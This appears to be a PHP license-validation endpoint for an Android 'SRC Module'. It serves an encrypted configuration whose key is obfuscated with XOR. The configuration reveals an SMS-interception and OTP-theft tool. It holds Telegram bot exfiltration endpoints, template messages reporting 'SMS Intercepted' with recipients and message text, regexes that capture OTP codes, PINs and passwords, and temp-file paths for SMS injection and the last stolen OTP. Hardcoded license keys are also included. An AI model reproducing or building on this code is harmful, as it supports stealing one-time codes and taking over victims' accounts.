<?php
/**
 * SRC Module - License Validation API (Vercel Serverless)
 * Endpoint: /api/validate
 * Method: POST
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit();
}

// Get input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!isset($data['key']) || empty($data['key'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'License key is required']);
    exit();
}

$licenseKey = trim($data['key']);

// Encryption function
function encryptConfig($jsonData) {
    $a = [
        0xa3, 0x5f, 0x12, 0xe7, 0x8b, 0x3d, 0xc1, 0x76,
        0x94, 0x0e, 0xf8, 0x2a, 0x6d, 0xb5, 0x43, 0x91,
        0xd2, 0x7e, 0x06, 0xc9, 0x5a, 0xe3, 0x1f, 0x88,
        0x4b, 0xa0, 0x67, 0xd4, 0x3e, 0xf1, 0x25, 0x9c
    ];
    
    $b = [
        0x64, 0x45, 0x5d, 0x75, 0x6b, 0x65, 0x67, 0x45,
        0x65, 0x65, 0x65, 0x64, 0x45, 0x65, 0x35, 0x35,
        0x67, 0x40, 0x47, 0x45, 0x25, 0x25, 0x4d, 0x65,
        0x41, 0x73, 0x7f, 0x63, 0x61, 0x67, 0x65, 0x7d
    ];
    
    $key = '';
    for ($i = 0; $i < 32; $i++) {
        $key .= chr($a[$i] ^ $b[$i]);
    }
    
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($jsonData, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $encrypted);
}

// Valid keys
$validKeys = [
    'SLOVEO-261354332176-Keyee242211-2126',
    'S-2026',
    '-2026'
];

if (!in_array($licenseKey, $validKeys)) {
    http_response_code(200);
    echo json_encode(['status' => 'error', 'message' => 'Invalid license key']);
    exit();
}

// Create config
$config = [
    'timestamp' => time(),
    'expiry' => strtotime('2027-01-01 00:00:00'),
    'key_id' => 'TEST_001',
    'strings' => [
        'telegram_api_base' => 'https://api.telegram.org/bot',
        'telegram_endpoint' => '/sendMessage',
        'inject_cmd_file' => '/data/local/tmp/src_sms_inject.json',
        'last_otp_file' => '/data/local/tmp/src_last_otp.txt',
        'config_file_path' => '/data/local/tmp/src_module_config.json',
        'sms_notification_template' => "📬 *New Outgoing Message*\n━━━━━━━━━━━━━━━━━━\n📱 *Recipient:* `{dest}` | `{short}`\n💬 *Message:* `{msg}`\n━━━━━━━━━━━━━━━━━━\n*SMART TOKEN BELOW*\n━━━━━━━━━━━━━━━━━━\n🔦 *SMART:* `{dest}|{msg}`\n━━━━━━━━━━━━━━━━━━\n✅ *Status:* Null Binder @sloveo",
        'batch_header_template' => "📦 *Batch Summary — {count} SMS Intercepted*\n━━━━━━━━━━━━━━━━━━\n\n",
        'batch_footer_template' => "━━━━━━━━━━━━━━━━━━\n✅ *Batch Complete — {count} tokens processed*",
        'otp_keyword_regex' => '(?:OTP|otp|code|CODE|pin|PIN|password|passcode)[:\s-]*([0-9]{4,8})',
        'otp_standalone_regex' => '\b([0-9]{4,8})\b'
    ]
];

$encryptedConfig = encryptConfig(json_encode($config));

http_response_code(200);
echo json_encode(['status' => 'ok', 'data' => $encryptedConfig]);
?>










